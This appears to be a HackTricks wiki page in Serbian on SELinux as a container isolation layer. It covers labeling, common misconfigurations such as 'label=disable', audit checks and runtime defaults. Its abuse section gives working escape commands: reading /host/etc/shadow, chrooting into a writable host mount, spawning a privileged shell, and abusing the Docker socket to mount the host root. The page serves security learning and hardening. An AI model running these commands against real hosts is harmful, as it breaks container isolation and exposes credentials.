# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Pregled

SELinux je **obavezna kontrola pristupa zasnovana na etiketama (label-based Mandatory Access Control)**. Svaki relevantan proces i objekat može nositi bezbednosni kontekst, a politika odlučuje koji domeni mogu da interaguju sa kojim tipovima i na koji način. U okruženjima sa kontejnerima, to obično znači da runtime pokreće proces containera u ograničenom container domenu i označava sadržaj containera odgovarajućim tipovima. Ako politika funkcioniše ispravno, proces će moći da čita i piše stvari koje se očekuje da njegova etiketa treba da „dodirne“, dok će mu biti uskraćen pristup ostalom sadržaju hosta, čak i ako taj sadržaj postane vidljiv preko mount-a.

Ovo je jedna od najsnažnijih zaštita na strani hosta dostupnih u uobičajenim Linux kontejnerskim deploy-ima. Posebno je važna na Fedora, RHEL, CentOS Stream, OpenShift i drugim SELinux-centričnim ekosistemima. U tim okruženjima, recenzent koji ignoriše SELinux često neće razumeti zašto je put do kompromitacije hosta koji izgleda očigledno zapravo blokiran.

## AppArmor vs SELinux

Najjednostavnija razlika na visokom nivou je da je AppArmor zasnovan na putanjama (path-based), dok je SELinux **zasnovan na etiketama (label-based)**. To ima velike posledice po bezbednost kontejnera. Politika zasnovana na putanjama može se ponašati drugačije ako isti sadržaj hosta postane vidljiv pod neočekivanom mount putanjom. Politika zasnovana na etiketama umesto toga ispituje koja je etiketa objekta i šta domen procesa sme da radi sa njom. To ne čini SELinux jednostavnim, ali ga čini otpornim na klasu pretpostavki baziranih na trikovima sa putanjama koje branitelji ponekad slučajno prave u sistemima zasnovanim na AppArmor-u.

Pošto je model orijentisan na etikete, rukovanje volumenima containera i odluke o pre-označavanju (relabeling) su kritične za bezbednost. Ako runtime ili operator promeni etikete preširoko da bi "make mounts work", granica politike koja je trebalo da sadrži workload može postati znatno slabija nego što je predviđeno.

## Lab

Da biste proverili da li je SELinux aktivan na hostu:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Da biste pregledali postojeće oznake na hostu:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Da biste uporedili normalno izvršavanje sa onim gde je označavanje onemogućeno:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Na hostu sa omogućenim SELinux-om, ovo je vrlo praktična demonstracija jer pokazuje razliku između workload-a koji radi pod očekivanim container domenom i onog kome je taj enforcement sloj uklonjen.

## Runtime Usage

Podman je posebno usklađen sa SELinux-om na sistemima gde je SELinux deo podrazumevane platforme. Rootless Podman u kombinaciji sa SELinux-om je jedna od najsnažnijih mainstream container baselines jer je proces već neprivilegovan na host strani i i dalje je ograničen MAC policy-jem. Docker takođe može koristiti SELinux gde je podržano, mada administratori ponekad onemoguće SELinux da bi zaobišli friction sa volume-labeling-om. CRI-O i OpenShift se u velikoj meri oslanjaju na SELinux kao deo svoje container isolation priče. Kubernetes takođe može izložiti SELinux-povezana podešavanja, ali njihova vrednost očigledno zavisi od toga da li node OS zaista podržava i primenjuje SELinux.

Ponavljajuća lekcija je da SELinux nije opciona dekoracija. U ekosistemima koji su izgrađeni oko njega, on je deo očekivane sigurnosne granice.

## Misconfigurations

Klasična greška je `label=disable`. Operativno, to se često dešava zato što je volume mount bio odbijen i najbrži kratkoročni odgovor bio je ukloniti SELinux iz jednačine umesto ispravljanja modela label-ovanja. Još jedna česta greška je netačno relabeling host sadržaja. Široke relabel operacije mogu naterati aplikaciju da radi, ali isto tako mogu proširiti šta container sme da dira daleko izvan onoga što je prvobitno bilo zamišljeno.

Takođe je važno ne brkati **installed** SELinux sa **effective** SELinux-om. Host može podržavati SELinux i ipak biti u permissive mode, ili runtime možda ne pokreće workload pod očekivanim domenom. U tim slučajevima zaštita je mnogo slabija nego što dokumentacija može sugerisati.

## Abuse

Kada je SELinux odsutan, u permissive režimu, ili široko onemogućen za workload, host-mounted putanje postaju mnogo lakše za zloupotrebu. Isti bind mount koji bi inače bio ograničen label-ovima može postati direktan put do host podataka ili izmene host-a. Ovo je posebno relevantno kada se kombinuje sa writable volume mounts, container runtime direktorijumima, ili operativnim prečicama koje su izložile osetljive host putanje radi pogodnosti.

SELinux često objašnjava zašto generic breakout writeup radi odmah na jednom hostu ali se ponavljano ne uspeva na drugom iako runtime flags izgledaju slično. Nedostajući sastojak često nije namespace ili capability, već granica label-a koja je ostala netaknuta.

Najbrža praktična provera je uporediti aktivni kontekst i zatim ispitati mounted host putanje ili runtime direktorijume koji bi obično bili label-confined:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Ako je prisutan host bind mount i SELinux labeling je onemogućen ili oslabljen, često prvo dolazi do otkrivanja informacija:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Ako je mount upisiv i container iz kernelove perspektive efektivno host-root, sledeći korak je testirati kontrolisanu modifikaciju hosta umesto nagađanja:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Na hostovima sa podrškom za SELinux, gubitak oznaka na direktorijumima runtime stanja takođe može otkriti direktne privilege-escalation puteve:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Ove komande ne zamenjuju ceo escape chain, ali vrlo brzo pokazuju da li je SELinux ono što je sprečavalo pristup podacima hosta ili izmenu fajlova na strani hosta.

### Potpun primer: SELinux Disabled + Writable Host Mount

Ako je SELinux labeling onemogućen i fajl-sistem hosta montiran kao writable na `/host`, potpuni host escape postaje normalan slučaj zloupotrebe bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Ako `chroot` uspe, proces kontejnera sada radi iz datotečnog sistema hosta:
```bash
id
hostname
cat /etc/passwd | tail
```
### Potpun primer: SELinux onemogućen + runtime direktorijum

Ako radno opterećenje može da pristupi runtime soketu kada su label-e onemogućene, bekstvo se može delegirati na runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Relevantno zapažanje je da je SELinux često bio mehanizam koji onemogućava upravo ovu vrstu host-path ili runtime-state pristupa.

## Checks

Cilj SELinux provera je da potvrdi da je SELinux omogućen, identifikuje trenutni security context, i proveri da li su fajlovi ili putanje koje vas zanimaju zaista label-confined.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
What is interesting here:

- `getenforce` bi idealno trebalo da vrati `Enforcing`; `Permissive` ili `Disabled` menjaju značenje celog SELinux odeljka.
- Ako trenutni kontekst procesa izgleda neočekivano ili previše široko, radno opterećenje možda ne radi pod predviđenom container policy.
- Ako fajlovi montirani sa hosta ili runtime direktorijumi imaju oznake koje proces može previše slobodno da pristupi, bind mounts postaju mnogo opasniji.

Prilikom pregleda containera na platformi koja podržava SELinux, ne tretirajte označavanje kao sporedni detalj. U mnogim slučajevima to je jedan od glavnih razloga zašto host još nije kompromitovan.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Zavisno od hosta | SELinux separacija je dostupna na hostovima sa omogućenim SELinux-om, ali tačno ponašanje zavisi od konfiguracije hosta/daemon-a | `--security-opt label=disable`, široko relabelovanje bind mounts, `--privileged` |
| Podman | Obično omogućen na SELinux hostovima | SELinux separacija je normalan deo Podman-a na SELinux sistemima osim ako nije onemogućena | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Generalno se ne postavlja automatski na nivou Poda | Postoji podrška za SELinux, ali Podi obično zahtevaju `securityContext.seLinuxOptions` ili podrazumevane vrednosti specifične za platformu; potrebna je podrška runtime-a i čvorova | slabe ili široke `seLinuxOptions`, pokretanje na permissive/disabled čvorovima, platformske politike koje onemogućavaju označavanje |
| CRI-O / OpenShift style deployments | U velikoj meri se oslanja | SELinux je često osnovni deo modela izolacije čvorova u ovim okruženjima | prilagođene politike koje previše proširuju pristup, onemogućavanje označavanja ради kompatibilnosti |

SELinux podrazumevana podešavanja zavise od distribucije više nego seccomp podrazumevana podešavanja. Na Fedora/RHEL/OpenShift-style sistemima, SELinux je često centralan za model izolacije. Na sistemima bez SELinux-a, on jednostavno ne postoji.
